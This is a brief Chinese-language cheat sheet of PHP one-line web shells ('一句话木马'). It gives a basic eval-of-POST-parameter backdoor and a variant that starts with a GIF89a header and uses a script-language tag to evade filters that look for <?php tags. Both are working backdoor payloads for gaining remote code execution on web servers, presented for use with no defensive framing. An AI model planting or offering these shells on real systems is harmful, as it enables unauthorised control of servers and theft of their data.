### 基础php一句话木马:

```php
<?php @eval($_POST['pass']);?>
```

### 规避`<?php ?>`:

```php
GIF89a? <script language="php">eval($_REQUEST[123])</script>
```